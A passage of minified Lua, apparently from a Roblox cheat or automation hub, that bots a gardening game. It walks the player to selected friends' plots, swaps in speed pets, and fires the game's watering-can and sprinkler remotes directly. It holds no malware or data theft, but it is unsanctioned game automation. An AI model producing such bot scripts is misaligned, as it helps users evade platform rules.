					Z.FriendGardenCare.FriendNamesFriendGardenCare[y] = j
					table.insert(G, {
						Text = Z.FriendGardenCare.GetPlayerDropdownTextFriendGardenCare(y, j),
						Value = y
					})
				end
			end
		end
		for y, j in ipairs(Z.FriendGardenCare.GetSelectionValuesFriendGardenCare(h.friend_garden_care_friends)) do
			if not V[j] then
				V[j] = true
				local y = tostring(Z.FriendGardenCare.FriendNamesFriendGardenCare[j] or "Saved player")
				table.insert(G, {
					Text = Z.FriendGardenCare.GetPlayerDropdownTextFriendGardenCare(j, y),
					Value = j
				})
			end
		end
		table.sort(G, function(G, V)
			return tostring(G.Text or "") < tostring(V.Text or "")
		end)
		return G, true
	end,
	RefreshFriendDropdownFriendGardenCare = function(G)
		local V, y = Z.FriendGardenCare.FetchFriendDropdownFriendGardenCare()
		local j = g.FriendGardenCareUi.FriendDropdownFriendGardenCare
		if j then
			j:SetValues(V)
			j:SetValue(h.friend_garden_care_friends, true)
		end
		local i = g.FriendGardenCareUi.LocationLabelFriendGardenCare
		if i and type(i.SetText) == "function" then
			i:SetText(Z.FriendGardenCare.GetSavedPositionTextFriendGardenCare())
		end
		if G then
			if y then
				g.Notify("Server player list refreshed", 3)
			else
				g.Notify("Could not refresh server player list", 3)
			end
		end
		return y
	end,
	ResetProgressFriendGardenCare = function()
		table.clear(Z.FriendGardenCare.ProgressByFriendFriendGardenCare)
		Z.FriendGardenCare.RejoinRequestedAtFriendGardenCare = 0
		return true
	end,
	GetSelectedOnlineFriendsFriendGardenCare = function()
		local G = {}
		for V, j in ipairs(Z.FriendGardenCare.GetSelectionValuesFriendGardenCare(h.friend_garden_care_friends)) do
			local i = tonumber(j)
			local c
			if i then
				c = y.Players:GetPlayerByUserId(i)
			end
			if c and c ~= y.LocalPlayer then
				Z.FriendGardenCare.FriendNamesFriendGardenCare[j] = tostring(c.Name or j)
				table.insert(G, c)
			end
		end
		table.sort(G, function(G, V)
			return tostring(G.Name or "") < tostring(V.Name or "")
		end)
		return G
	end;
	GetPlotFriendGardenCare = function(G)
		G = tonumber(G)
		if not G then
			return nil
		end
		local V = y.Workspace:FindFirstChild("Gardens")
		if not V then
			return nil
		end
		local Z = y.Players:GetPlayerByUserId(G)
		local j
		if Z then
			j = tonumber(Z:GetAttribute("PlotId"))
		end
		if j then
			local y = V:FindFirstChild("Plot" .. tostring(j))
			if y and tonumber(y:GetAttribute("OwnerUserId")) == G then
				return y
			end
		end
		for V, y in ipairs(V:GetChildren()) do
			if tonumber(y:GetAttribute("OwnerUserId")) == G then
				return y
			end
		end
		return nil
	end,
	GetPlotIdFriendGardenCare = function(G)
		if typeof(G) ~= "Instance" then
			return nil
		end
		return tonumber((tostring(G.Name or "")):match("%d+"))
	end,
	GetPlantAreasFriendGardenCare = function(G)
		local V = {}
		local y
		if typeof(G) == "Instance" then
			y = G:FindFirstChild("Visual")
		end
		if not y then
			return V
		end
		for G, Z in ipairs({
			"PlantAreaColumn1",
			"PlantAreaColumn2"
		}) do
			local j = y:FindFirstChild(Z)
			if j and j:IsA("BasePart") then
				table.insert(V, j)
			end
		end
		return V
	end;
	GetPlantAreaFriendGardenCare = function(G, V)
		V = tostring(V or "")
		for G, y in ipairs(Z.FriendGardenCare.GetPlantAreasFriendGardenCare(G)) do
			if y.Name == V then
				return y
			end
		end
		return nil
	end;
	GetPlantAreaAtPositionFriendGardenCare = function(G, V)
		if typeof(V) ~= "Vector3" then
			return nil, nil
		end
		for G, y in ipairs(Z.FriendGardenCare.GetPlantAreasFriendGardenCare(G)) do
			local Z = y.CFrame:PointToObjectSpace(V)
			if math.abs(Z.X) <= y.Size.X / 2 and math.abs(Z.Z) <= y.Size.Z / 2 then
				return y, Z
			end
		end
		return nil, nil
	end,
	GetPlotCenterCFrameFriendGardenCare = function(G)
		local V
		if typeof(G) == "Instance" then
			V = G:FindFirstChild("Visual")
		end
		local y
		if V then
			y = V:FindFirstChild("PRIM")
		end
		if y and y:IsA("BasePart") then
			return y.CFrame
		end
		if y and y:IsA("Model") then
			return y:GetPivot()
		end
		return nil
	end;
	GetFarmMiddlePositionFriendGardenCare = function(G)
		local V = Z.FriendGardenCare.GetPlotCenterCFrameFriendGardenCare(G)
		if typeof(V) ~= "CFrame" then
			return nil, nil
		end
		local y = V.Position
		local j
		local i
		local c = math.huge
		local function J(G)
			local V = G.CFrame:PointToObjectSpace(y)
			local Z = math.clamp(V.X, - G.Size.X / 2, G.Size.X / 2)
			local J = math.clamp(V.Z, - G.Size.Z / 2, G.Size.Z / 2)
			local T = G.CFrame:PointToWorldSpace(Vector3.new(Z, G.Size.Y / 2, J))
			local d = ((T - y)).Magnitude
			if d < c then
				c = d
				j = G
				i = T
			end
		end
		local T = Z.FriendGardenCare.GetPlantAreasFriendGardenCare(G)
		for G, y in ipairs(T) do
			local Z = V:PointToObjectSpace(y.Position)
			if Z.X >= 0 then
				J(y)
			end
		end
		if not j then
			for G, V in ipairs(T) do
				J(V)
			end
		end
		if not j or typeof(i) ~= "Vector3" then
			return nil, nil
		end
		local d = j.CFrame:PointToObjectSpace(i)
		local u = math.clamp(d.X + 5, - j.Size.X / 2, j.Size.X / 2)
		return j.CFrame:PointToWorldSpace(Vector3.new(u, j.Size.Y / 2, d.Z)), j
	end;
	GetDefaultPlacementPositionFriendGardenCare = function(G, V)
		local y, j, i = Z.Farm.GetPlacementPositionFarm(V, G)
		if i ~= W.Default then
			return y, j, i
		end
		y, j = Z.FriendGardenCare.GetFarmMiddlePositionFriendGardenCare(G)
		return y, j, i
	end;
	GetTargetPositionFriendGardenCare = function(G, V)
		local y = tostring(h.friend_garden_care_location_mode or W.UseDefault)
		local j = h.friend_garden_care_saved_positions
		local i
		if type(j) == "table" then
			i = j[tostring(G)]
		end
		if y == "Saved Location" and type(i) == "table" then
			local G = Z.FriendGardenCare.GetPlantAreaFriendGardenCare(V, i.area)
			local j = tonumber(i.x)
			local c = tonumber(i.z)
			if G and (j and (c and (math.abs(j) <= G.Size.X / 2 and math.abs(c) <= G.Size.Z / 2))) then
				return G.CFrame:PointToWorldSpace(Vector3.new(j, G.Size.Y / 2, c)), G, "Saved Location"
			end
			y = W.UseDefault
		end
		if not Z.Farm.IsPlacementModeFarm(y) then
			y = W.UseDefault
		end
		local c, J, T = Z.FriendGardenCare.GetDefaultPlacementPositionFriendGardenCare(V, y)
		return c, J, T
	end,
	SaveCurrentPositionFriendGardenCare = function()
		local G = y.Character and y.Character:FindFirstChild("HumanoidRootPart")
		if not G then
			return false, "Character not found"
		end
		local V = y.Workspace:FindFirstChild("Gardens")
		if not V then
			return false, "Gardens not found"
		end
		for V, j in ipairs(V:GetChildren()) do
			local i = tonumber(j:GetAttribute("OwnerUserId"))
			if not i or i == tonumber(g.player_userid) then
				continue
			end
			local c = tostring(i)
			if not Z.FriendGardenCare.IsSelectedFriendGardenCare(h.friend_garden_care_friends, c) then
				continue
			end
			local J, T = Z.FriendGardenCare.GetPlantAreaAtPositionFriendGardenCare(j, G.Position)
			if not J or typeof(T) ~= "Vector3" then
				continue
			end
			if type(h.friend_garden_care_saved_positions) ~= "table" then
				h.friend_garden_care_saved_positions = {}
			end
			local d = y.Players:GetPlayerByUserId(i)
			local u = tostring(Z.FriendGardenCare.FriendNamesFriendGardenCare[c] or c)
			if d then
				u = tostring(d.Name or c)
			end
			h.friend_garden_care_saved_positions[c] = {
				area = J.Name,
				x = T.X;
				z = T.Z
			}
			h.friend_garden_care_location_mode = "Saved Location"
			Z.FriendGardenCare.ResetProgressFriendGardenCare()
			a.Save.SaveDataSync()
			return true, "Saved location for " .. u
		end
		return false, "Stand inside a selected player\'s plant area"
	end;
	GetSavedPositionTextFriendGardenCare = function()
		local G = Z.FriendGardenCare.GetSelectionValuesFriendGardenCare(h.friend_garden_care_friends)
		if # G == 0 then
			return "\240\159\147\141 Saved Locations: select players first"
		end
		local V = 0
		local y = h.friend_garden_care_saved_positions
		for G, Z in ipairs(G) do
			local j
			if type(y) == "table" then
				j = y[Z]
			end
			if type(j) == "table" and (tostring(j.area or "") ~= "" and (tonumber(j.x) and tonumber(j.z))) then
				V += 1
			end
		end
		return string.format("\240\159\147\141 Saved Locations: %d/%d selected players", V, # G)
	end,
	GetWateringCanDataFriendGardenCare = function(G)
		G = tostring(G or "")
		if G == "" or type(y.WateringcanData) ~= "table" then
			return nil
		end
		for V, y in ipairs(y.WateringcanData) do
			if type(y) == "table" and tostring(y.Name or "") == G then
				return y
			end
		end
		return nil
	end,
	GetToolCountFriendGardenCare = function(G)
		if typeof(G) ~= "Instance" or not G.Parent or not G:IsA("Tool") then
			return 0
		end
		local V = tonumber(G:GetAttribute("Count") or G:GetAttribute("Amount") or G:GetAttribute("Quantity"))
		if V == nil then
			return 1
		end
		return math.max(math.floor(V), 0)
	end,
	GetUsableToolCountFriendGardenCare = function(G, V)
		local y = Z.FriendGardenCare.GetToolCountFriendGardenCare(G)
		local j = Z.StackKeepOverrides.GetKeepAmountStackKeepOverrides("Gear", V)
		if j == nil then
			return y
		end
		return math.max(y - j, 0)
	end,
	GetWateringToolFriendGardenCare = function(G)
		G = tostring(G or "")
		if G == "" or not Z.FriendGardenCare.GetWateringCanDataFriendGardenCare(G) then
			return nil
		end
		for V, y in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if y:IsA("Tool") and tostring(y:GetAttribute("WateringCan") or "") == G then
				if Z.FriendGardenCare.GetUsableToolCountFriendGardenCare(y, G) > 0 then
					return y
				end
			end
		end
		return nil
	end,
	GetAvailableWateringCountFriendGardenCare = function()
		local G = 0
		for V, y in ipairs(Z.FriendGardenCare.GetSelectionValuesFriendGardenCare(h.friend_garden_care_watering_cans)) do
			local j = Z.FriendGardenCare.GetWateringToolFriendGardenCare(y)
			if j then
				G += Z.FriendGardenCare.GetUsableToolCountFriendGardenCare(j, y)
			end
		end
		return G
	end;
	EquipToolFriendGardenCare = function(G)
		if not G or not G:IsA("Tool") or not G.Parent then
			return false
		end
		if Z.Player.IsToolHeld(G) then
			return true
		end
		Z.Player.UnequipTools()
		if not Z.Player.EquipTool(G) then
			return false
		end
		Z.FriendGardenCare.EquippedBySystemFriendGardenCare = true
		task.wait(.1)
		return Z.Player.IsToolHeld(G)
	end;
	CleanupToolFriendGardenCare = function()
		if Z.FriendGardenCare.EquippedBySystemFriendGardenCare then
			Z.FriendGardenCare.EquippedBySystemFriendGardenCare = false
			Z.Player.UnequipTools()
		end
	end,
	RestoreSpeedPetsFriendGardenCare = function()
		local G = Z.FriendGardenCare.SpeedPetStateFriendGardenCare
		if type(G) ~= "table" then
			return false
		end
		Z.FriendGardenCare.SpeedPetStateFriendGardenCare = nil
		local V = Z.PetTriggersV2
		local y = Z.PetEquipTriggers
		if type(V) ~= "table" or type(y) ~= "table" then
			return false
		end
		local j, i = pcall(function()
			for y, Z in ipairs(V.GetInventoryPetsPetTriggersV2()) do
				local j = tostring(Z.id or Z.key or "")
				if Z.equipped and (j ~= "" and G.equippedIds[j] ~= true) then
					V.UnequipPetPetTriggersV2(j)
					task.wait(.1)
				end
			end
			local y = V.GetEquippedIdsPetTriggersV2()
			for Z, j in ipairs(V.GetInventoryPetsPetTriggersV2()) do
				local i = tostring(j.id or j.key or "")
				if i ~= "" and (G.equippedIds[i] == true and y[i] ~= true) then
					V.EquipPetPetTriggersV2(j)
					task.wait(.1)
				end
			end
			Z.Player.UnequipTools()
		end)
		V.BusyPetTriggersV2 = false
		y.BusyPetEquipTriggers = false
		if not j then
			warn("[FriendGardenCare Speed Pets]", i)
		end
		return j
	end,
	EquipSpeedPetsFriendGardenCare = function()
		if h.friend_garden_care_use_speed_pets ~= true then
			return false
		end
		if type(Z.FriendGardenCare.SpeedPetStateFriendGardenCare) == "table" then
			return true
		end
		local G = Z.PetTriggersV2
		local V = Z.PetEquipTriggers
		if type(G) ~= "table" or type(V) ~= "table" then
			return false
		end
		if G.BusyPetTriggersV2 == true or V.BusyPetEquipTriggers == true then
			return false
		end
		local y = G.GetInventoryPetsPetTriggersV2()
		local j = G.BuildSelectionPetTriggersV2({
			loadoutMode = "Speed",
			pets = {}
		})
		if type(j) ~= "table" or # j == 0 then
			return false
		end
		local i = {}
		for G, V in ipairs(y) do
			local y = tostring(V.id or V.key or "")
			if V.equipped and y ~= "" then
				i[y] = true
			end
		end
		Z.FriendGardenCare.SpeedPetStateFriendGardenCare = {
			equippedIds = i
		}
		G.BusyPetTriggersV2 = true
		V.BusyPetEquipTriggers = true
		local c, J = pcall(function()
			local V = {}
			for G, y in ipairs(j) do
				local Z = tostring(y.id or y.key or "")
				if Z ~= "" then
					V[Z] = true
				end
			end
			for y, Z in ipairs(y) do
				local j = tostring(Z.id or Z.key or "")
				if Z.equipped and (j ~= "" and V[j] ~= true) then
					G.UnequipPetPetTriggersV2(j)
					task.wait(.1)
				end
			end
			local i = G.GetEquippedIdsPetTriggersV2()
			for V, y in ipairs(j) do
				local Z = tostring(y.id or y.key or "")
				if Z ~= "" and i[Z] ~= true then
					G.EquipPetPetTriggersV2(y)
					task.wait(.1)
				end
			end
			Z.Player.UnequipTools()
		end)
		if not c then
			warn("[FriendGardenCare Speed Pets]", J)
			Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
			return false
		end
		return true
	end;
	EnsureNearTargetFriendGardenCare = function(G, V)
		if typeof(G) ~= "Vector3" then
			return false, "Invalid watering position"
		end
		if type(V) == "function" and V() ~= true then
			return false, "Watering cancelled"
		end
		local j = y.Character and y.Character:FindFirstChild("HumanoidRootPart")
		if not j then
			return false, "Character not found"
		end
		local i = Vector3.new(G.X - j.Position.X, 0, G.Z - j.Position.Z)
		if i.Magnitude <= 2 then
			return true
		end
		local c = g.TeleportLockNames.FriendGardenCare
		if Z.Teleport.IsLocked(c) then
			return false, "Movement is busy"
		end
		if not Z.Teleport.LockTeleport(c, 182, true) then
			return false, "Movement is busy"
		end
		Z.FriendGardenCare.SetStatusFriendGardenCare("Walking to player\'s garden...", "#66CCFF")
		Z.Movement.MoveLikePlayerToPoint(G, 180, V, 1.5)
		Z.Teleport.UnlockTeleport(c)
		if type(V) == "function" and V() ~= true then
			return false, "Watering cancelled"
		end
		j = y.Character and y.Character:FindFirstChild("HumanoidRootPart")
		if j then
			i = Vector3.new(G.X - j.Position.X, 0, G.Z - j.Position.Z)
			if i.Magnitude <= 2 then
				return true
			end
		end
		return false, "Could not reach watering position"
	end;
	UseWateringCanFriendGardenCare = function(G, V, j)
		local i = y.Networking and (y.Networking.WateringCan and y.Networking.WateringCan.UseWateringCan)
		if not i or type(i.Fire) ~= "function" then
			return false
		end
		if typeof(G) ~= "Vector3" or not j or not j:IsA("Tool") or not Z.Player.IsToolHeld(j) then
			return false
		end
		local c = Z.FriendGardenCare.GetToolCountFriendGardenCare(j)
		local J = pcall(function()
			i:Fire(G - Vector3.new(0, .3, 0), V, j)
		end)
		if not J then
			return false
		end
		local T = os.clock() + 2
		repeat
			if not j.Parent and c > 0 then
				return true
			end
			if Z.FriendGardenCare.GetToolCountFriendGardenCare(j) < c then
				return true
			end
			task.wait(.05)
		until os.clock() >= T
		return false
	end,
	SpendWateringCansFriendGardenCare = function(G, V, y)
		local j = Z.FriendGardenCare.GetSelectionValuesFriendGardenCare(h.friend_garden_care_watering_cans)
		if # j == 0 then
			return true, 0
		end
		local function i()
			if not G.Parent or h.friend_garden_care_enabled ~= true then
				return false
			end
			for G, V in ipairs(j) do
				if not Z.FriendGardenCare.IsSelectedFriendGardenCare(h.friend_garden_care_watering_cans, V) then
					return false
				end
			end
			return true
		end
		local function c()
			if not G.Parent then
				return "Player left server"
			end
			if h.friend_garden_care_enabled ~= true then
				return "System disabled"
			end
			return "Watering cans changed"
		end
		local function J(G, V, y)
			if h.friend_garden_care_use_speed_pets ~= true then
				Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
			end
			return G, V, y
		end
		if y.waterTarget == nil then
			local G = Z.FriendGardenCare.GetAvailableWateringCountFriendGardenCare()
			local V = math.max(math.floor(tonumber(h.friend_garden_care_max_watering) or 0), 0)
			y.waterTarget = G
			if V > 0 then
				y.waterTarget = math.min(V, G)
			end
			y.watered = 0
		end
		local T = math.max(math.floor(tonumber(y.waterTarget) or 0), 0)
		y.watered = math.max(math.floor(tonumber(y.watered) or 0), 0)
		if y.watered >= T then
			return true, 0
		end
		if not i() then
			return false, 0, c()
		end
		Z.FriendGardenCare.EquipSpeedPetsFriendGardenCare()
		local d, u = Z.FriendGardenCare.EnsureNearTargetFriendGardenCare(V, i)
		if not d then
			if not i() then
				u = c()
			end
			return J(false, 0, u)
		end
		local q = 0
		for j, d in ipairs(j) do
			while y.watered < T do
				if not i() then
					return J(false, q, c())
				end
				local j = Z.FriendGardenCare.GetWateringToolFriendGardenCare(d)
				if not j then
					break
				end
				if not Z.FriendGardenCare.GetWateringCanDataFriendGardenCare(d) then
					break
				end
				if not Z.FriendGardenCare.EquipToolFriendGardenCare(j) then
					return J(false, q, "Could not equip " .. d)
				end
				Z.FriendGardenCare.SetStatusFriendGardenCare(string.format("Watering %s with %s %d/%d", G.Name, d, y.watered + 1, T), "#66CCFF")
				if not Z.FriendGardenCare.UseWateringCanFriendGardenCare(V, d, j) then
					return J(false, q, "Watering failed with " .. d)
				end
				y.watered += 1
				q += 1
				task.wait(Z.FriendGardenCare.GetDelayFriendGardenCare())
			end
			if y.watered >= T then
				break
			end
		end
		if y.watered < T and Z.FriendGardenCare.GetAvailableWateringCountFriendGardenCare() <= 0 then
			y.waterTarget = y.watered
			T = y.watered
		end
		return J(y.watered >= T, q)
	end,
	GetSprinklerDataFriendGardenCare = function(G)
		local V = y.GardenSyncController
		if type(V) ~= "table" or type(V.GetSprinklers) ~= "function" then
			return {}
		end
		local Z, j = pcall(function()
			return V:GetSprinklers(G)
		end)
		if not Z or type(j) ~= "table" then
			return {}
		end
		return j
	end;
	GetFriendSprinklerCountFriendGardenCare = function(G, V, y)
		local j = 0
		for G, V in pairs(Z.FriendGardenCare.GetSprinklerDataFriendGardenCare(G)) do
			if type(V) == "table" and tostring(V.SprinklerName or "") == y then
				j += 1
			end
		end
		local i = 0
		local c
		if typeof(V) == "Instance" then
			c = V:FindFirstChild("Sprinklers")
		end
		if c then
			for G, V in ipairs(c:GetChildren()) do
				if tostring(V:GetAttribute("SprinklerName") or "") == y then
					i += 1
				end
			end
		end
		return math.max(j, i)
	end,
	GetOccupiedSprinklerPositionsFriendGardenCare = function(G, V)
		local y = {}
		local j
		if typeof(V) == "Instance" then
			j = V:FindFirstChild("SpawnPoint")
		end
		if j and j:IsA("BasePart") then
			for G, V in pairs(Z.FriendGardenCare.GetSprinklerDataFriendGardenCare(G)) do
				local Z
				if type(V) == "table" then
					Z = V.Positions
				end
				local i
				local c
				local J
				if type(Z) == "table" then
					i = tonumber(Z.PosX)
					c = tonumber(Z.PosY)
					J = tonumber(Z.PosZ)
				end
				if i and (c and J) then
					table.insert(y, j.CFrame:PointToWorldSpace(Vector3.new(i, c, J)))
				end
			end
		end
		local i
		if typeof(V) == "Instance" then
			i = V:FindFirstChild("Sprinklers")
		end
		if i then
			for G, V in ipairs(i:GetChildren()) do
				local Z
				if V:IsA("Model") then
					Z = (V:GetPivot()).Position
				elseif V:IsA("BasePart") then
					Z = V.Position
				end
				if typeof(Z) == "Vector3" then
					table.insert(y, Z)
				end
			end
		end
		return y
	end;
	IsSprinklerPositionOpenFriendGardenCare = function(G, V)
		if typeof(G) ~= "Vector3" then
			return false
		end
		for V, y in ipairs(V or {}) do
			if typeof(y) == "Vector3" then
				local V = Vector3.new(G.X - y.X, 0, G.Z - y.Z)
				if V.Magnitude < 1 then
					return false
				end
			end
		end
		return true
	end,
	GetOpenSprinklerPositionFriendGardenCare = function(G, V, y)
		if typeof(G) ~= "Vector3" or not V or not V:IsA("BasePart") then
			return nil
		end
		local j = 1.35
		local i = V.CFrame:PointToObjectSpace(G)
		local c = math.max(V.Size.X / 2 - .5, 0)
		local J = math.max(V.Size.Z / 2 - .5, 0)
		local T = math.max(math.ceil(V.Size.X / j), math.ceil(V.Size.Z / j))
		local function d(G, T)
			local d = i.X + G * j
			local u = i.Z + T * j
			if math.abs(d) > c or math.abs(u) > J then
				return nil
			end
			local q = V.CFrame:PointToWorldSpace(Vector3.new(d, V.Size.Y / 2, u))
			if Z.FriendGardenCare.IsSprinklerPositionOpenFriendGardenCare(q, y) then
				return q
			end
			return nil
		end
		local u = d(0, 0)
		if u then
			return u
		end
		for G = 1, T, 1 do
			for V = - G, G, 1 do
				u = d(V, - G)
				if u then
					return u
				end
				u = d(V, G)
				if u then
					return u
				end
			end
			for V = - G + 1, G - 1, 1 do
				u = d(- G, V)
				if u then
					return u
				end
				u = d(G, V)
				if u then
					return u
				end
			end
		end
		return nil
	end;
	PlaceSprinklerFriendGardenCare = function(G, V, j, i, c)
		local J = Z.FriendGardenCare.GetPlotIdFriendGardenCare(V)
		local T = y.Networking and (y.Networking.Place and y.Networking.Place.PlaceSprinkler)
		if not J or not T or type(T.Fire) ~= "function" then
			return false
		end
		if typeof(i) ~= "Vector3" or not c or not c:IsA("Tool") or not Z.Player.IsToolHeld(c) then
			return false
		end
		local d = Z.FriendGardenCare.GetFriendSprinklerCountFriendGardenCare(G, V, j)
		local u = Z.FriendGardenCare.GetToolCountFriendGardenCare(c)
		local q = pcall(function()
			T:Fire(i, j, c, J)
		end)
		if not q then
			return false
		end
		local g = os.clock() + 2
		repeat
			if Z.FriendGardenCare.GetFriendSprinklerCountFriendGardenCare(G, V, j) > d then
				return true
			end
			if not c.Parent and u > 0 then
				return true
			end
			if Z.FriendGardenCare.GetToolCountFriendGardenCare(c) < u then
				return true
			end
			task.wait(.05)
		until os.clock() >= g
		return false
	end,
	PlaceSelectedSprinklersFriendGardenCare = function(G, V, y, j, i)
		local c = Z.FriendGardenCare.GetSelectionValuesFriendGardenCare(h.friend_garden_care_sprinklers)
		if # c == 0 then
			return true, 0
		end
		if type(i.sprinklers) ~= "table" then
			i.sprinklers = {}
		end
		local J = Z.FriendGardenCare.GetOccupiedSprinklerPositionsFriendGardenCare(G.UserId, V)
		local T = 0
		for c, d in ipairs(c) do
			if i.sprinklers[d] == true then
				continue
			end
			if not G.Parent or h.friend_garden_care_enabled ~= true then
				return false, T, "Player left server"
			end
			local u = Z.SprinklerPlacer.GetTool(d)
			if not u then
				i.sprinklers[d] = true
				continue
			end
			local q = Z.FriendGardenCare.GetOpenSprinklerPositionFriendGardenCare(y, j, J)
			if not q then
				return false, T, "No open sprinkler position"
			end
			if not Z.FriendGardenCare.EquipToolFriendGardenCare(u) then
				return false, T, "Could not equip " .. d
			end
			Z.FriendGardenCare.SetStatusFriendGardenCare("Placing " .. (d .. (" for " .. G.Name)), "#66CCFF")
			if not Z.FriendGardenCare.PlaceSprinklerFriendGardenCare(G.UserId, V, d, q, u) then
				return false, T, "Sprinkler placement failed"
			end
			i.sprinklers[d] = true
			T += 1
			table.insert(J, q)
			task.wait(Z.FriendGardenCare.GetDelayFriendGardenCare())
		end
		return true, T
	end;
	ProcessFriendGardenCare = function(G)
		local V = tostring(G.UserId)
		local y = Z.FriendGardenCare.GetPlotFriendGardenCare(G.UserId)
		if not y then
			return false, "Waiting for " .. (G.Name .. "\'s plot")
		end
		local j, i = Z.FriendGardenCare.GetTargetPositionFriendGardenCare(V, y)
		if typeof(j) ~= "Vector3" or not i or not i:IsA("BasePart") then
			return false, "Could not resolve " .. (G.Name .. "\'s location")
		end
		local c = Z.FriendGardenCare.ProgressByFriendFriendGardenCare[V]
		if type(c) ~= "table" then
			c = {
				sprinklers = {};
				watered = 0
			}
			Z.FriendGardenCare.ProgressByFriendFriendGardenCare[V] = c
		end
		local J, T, d = Z.FriendGardenCare.PlaceSelectedSprinklersFriendGardenCare(G, y, j, i, c)
		if not J then
			return false, d, T
		end
		local u, q, g = Z.FriendGardenCare.SpendWateringCansFriendGardenCare(G, j, c)
		if not u then
			return false, g, T + q
		end
		c.completed = true
		return true, "Completed " .. G.Name, T + q
	end,
	RunFriendGardenCare = function()
		if h.friend_garden_care_use_speed_pets ~= true then
			Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
		end
		if h.friend_garden_care_enabled ~= true then
			Z.FriendGardenCare.ClearStatusFriendGardenCare()
			return 0
		end
		if not q.IsLoadingCompleted() then
			Z.FriendGardenCare.SetStatusFriendGardenCare("Waiting for garden load", "#FFCC66")
			return 0
		end
		local G = Z.FriendGardenCare.GetSelectionValuesFriendGardenCare(h.friend_garden_care_friends)
		if # G == 0 then
			Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
			Z.FriendGardenCare.SetStatusFriendGardenCare("Select at least one player", "#FFCC66")
			return 0
		end
		local V = Z.FriendGardenCare.GetSelectionValuesFriendGardenCare(h.friend_garden_care_watering_cans)
		local y = Z.FriendGardenCare.GetSelectionValuesFriendGardenCare(h.friend_garden_care_sprinklers)
		if # V == 0 then
			Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
		end
		if # V == 0 and # y == 0 then
			Z.FriendGardenCare.SetStatusFriendGardenCare("Select watering cans or sprinklers", "#FFCC66")
			return 0
		end
		local j = Z.FriendGardenCare.GetSelectedOnlineFriendsFriendGardenCare()
		if # j == 0 then
			Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
			Z.FriendGardenCare.RejoinRequestedAtFriendGardenCare = 0
			Z.FriendGardenCare.SetStatusFriendGardenCare("Waiting for selected players", "#CFCFCF")
			return 0
		end
		for G, V in ipairs(j) do
			local y = tostring(V.UserId)
			local j = Z.FriendGardenCare.ProgressByFriendFriendGardenCare[y]
			if type(j) ~= "table" or j.completed ~= true then
				local G, y, j = Z.FriendGardenCare.ProcessFriendGardenCare(V)
				Z.FriendGardenCare.CleanupToolFriendGardenCare()
				Z.Teleport.UnlockTeleport(g.TeleportLockNames.FriendGardenCare)
				if not G then
					Z.FriendGardenCare.SetStatusFriendGardenCare(y or "Waiting", "#FFCC66")
					return tonumber(j) or 0
				end
				Z.FriendGardenCare.SetStatusFriendGardenCare(y, "#7CFC00")
				return tonumber(j) or 0
			end
		end
		Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
		local i = "s"
		if # j == 1 then
			i = ""
		end
		Z.FriendGardenCare.SetStatusFriendGardenCare(string.format("Completed for %d online player%s", # j, i), "#7CFC00")
		return 0
	end,
	LoopFriendGardenCare = function()
		if h.friend_garden_care_enabled ~= true then
			Z.FriendGardenCare.CleanupToolFriendGardenCare()
			Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
			Z.Teleport.UnlockTeleport(g.TeleportLockNames.FriendGardenCare)
			Z.FriendGardenCare.ClearStatusFriendGardenCare()
			return 0
		end
		if not g.GetCheckIfPro() then
			Z.FriendGardenCare.CleanupToolFriendGardenCare()
			Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
			Z.Teleport.UnlockTeleport(g.TeleportLockNames.FriendGardenCare)
			Z.FriendGardenCare.ClearStatusFriendGardenCare()
			return 0
		end
		if Z.FriendGardenCare.BusyFriendGardenCare then
			return 0
		end
		Z.FriendGardenCare.BusyFriendGardenCare = true
		local G, V = pcall(Z.FriendGardenCare.RunFriendGardenCare)
		Z.FriendGardenCare.BusyFriendGardenCare = false
		if not G then
			Z.FriendGardenCare.CleanupToolFriendGardenCare()
			Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
			Z.Teleport.UnlockTeleport(g.TeleportLockNames.FriendGardenCare)
			Z.FriendGardenCare.SetStatusFriendGardenCare("Garden care system error", "#FF4444")
			warn("[FriendGardenCare]", V)
			return 0
		end
		if h.friend_garden_care_enabled ~= true or h.friend_garden_care_use_speed_pets ~= true then
			Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
		end
		return tonumber(V) or 0
	end
}
q.PositionGrid = {
	Create = function(G)
		G = math.max(tonumber(G) or 1, .1)
		return {
			CellSize = G,
			Buckets = {}
		}
	end,
	Add = function(G, V)
		if type(G) ~= "table" or type(G.Buckets) ~= "table" or typeof(V) ~= "Vector3" then
			return false
		end
		local y = math.max(tonumber(G.CellSize) or 1, .1)
		local Z = math.floor(V.X / y)
		local j = math.floor(V.Z / y)
		local i = G.Buckets[Z]
		if not i then
			i = {}
			G.Buckets[Z] = i
		end
		local c = i[j]
		if not c then
			c = {}
			i[j] = c
		end
		table.insert(c, V)
		return true
	end,
	IsOpen = function(G, V, y)
		if type(G) ~= "table" or type(G.Buckets) ~= "table" or typeof(V) ~= "Vector3" then
			return false
		end
		local Z = math.max(tonumber(G.CellSize) or 1, .1)
		y = math.max(tonumber(y) or Z, 0)
		local j = y * y
		local i = math.max(math.ceil(y / Z), 1)
		local c = math.floor(V.X / Z)
		local J = math.floor(V.Z / Z)
		for y = c - i, c + i, 1 do
			local Z = G.Buckets[y]
			if not Z then
				continue
			end
			for G = J - i, J + i, 1 do
				local y = Z[G]
				if not y then
					continue
				end
				for G, y in ipairs(y) do
					local Z = V.X - y.X
					local i = V.Z - y.Z
					local c = Z * Z + i * i
					if c < j then
						return false
					end
				end
			end
		end
		return true
	end
}
g.SeedPlaceStatusText = ""
g.SmartSeedProgressionStatusText = ""
g.SmartSeedProgressionPlainStatusText = "Not enabled"
g.SmartSeedProgressionDebugText = ""
g.SmartSeedProgressionDebug = false
g.SmartSeedProgressionUiRefs = g.SmartSeedProgressionUiRefs or {}
Z.GardenSeedLimit = {
	PlantsPerSlotGardenSeedLimit = 200;
	FallbackMaximumSlotsGardenSeedLimit = 6;
	GetCurrentSlotGardenSeedLimit = function()
		local G = tonumber(Z.DataReplica.GetData("OwnedExpansions", 0)) or 0
		G = math.max(math.floor(G), 0)
		return G + 1
	end;
	GetMaximumSlotGardenSeedLimit = function()
